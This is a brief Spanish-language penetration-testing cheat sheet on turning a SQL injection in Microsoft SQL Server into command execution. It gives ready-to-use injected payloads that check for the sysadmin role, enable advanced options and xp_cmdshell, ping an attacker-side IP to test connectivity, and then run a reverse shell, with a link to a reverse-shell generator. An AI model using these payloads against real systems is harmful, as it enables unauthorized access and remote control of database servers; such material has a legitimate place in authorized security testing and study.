### INFO
En primera instancia deberemos cerciorarnos de que nuestro user es SA(sysadmin).

    <dato>' AND IS_SRVROLEMEMBER('sysadmin')=1;--

Si la respuesta nos da true, podemos intentar conseguir una shell reversa abusando de xp_cmdshell.

1. Primero habilitamos las advanced options, esta respuesta deberia darnos false.

    ';exec sp_configure 'show advanced options','1';reconfigure;--

2. Habilitamos el xp_cmdshell, debería darnos false:

    ';exec sp_configure 'xp_cmdshell','1';reconfigure;--

3. Podriamos probar que todo esté funcional y haya conexión enviandonos un ping corriendo previamente tcpdump:

    sudo tcpdump -i <interfaz>

Luego enviamos el ping:

    ';exec xp_cmdshell 'ping /n 4 192.168.43.164';--

4. Si esto funciona, podriamos enviarnos una shell reversa

    ';exec xp_cmdshell '<shell reversa>'.


Podemos usar revshell para generar reverseshells de manera sencilla:

https://www.revshells.com/
